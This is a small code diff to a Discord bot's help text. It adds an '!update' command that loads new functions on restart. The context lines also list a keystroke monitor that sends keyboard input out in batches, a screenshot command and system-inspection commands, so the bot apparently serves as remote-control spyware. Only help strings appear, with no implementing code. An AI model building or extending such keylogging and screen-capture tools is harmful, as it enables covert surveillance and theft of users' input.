@@ -39,6 +39,7 @@ class CustomHelpCommand(commands.HelpCommand):
         embed.add_field(name="!drives", value="Lists the available drives on the system.", inline=False)
         embed.add_field(name="!inputs", value="Monitors keyboard inputs and sends them in randomized batches.", inline=False)
         embed.add_field(name="!screenshot", value="Takes a screenshot of the user's screen(s).", inline=False)
+        embed.add_field(name="!update <file_name>", value="Updates or adds new functions upon restart.", inline=False)
         embed.add_field(name="!usage", value="Displays system usage information and uptime.", inline=False)
         embed.add_field(name="!window", value="Lists the information of the window currently focused.", inline=False)
 
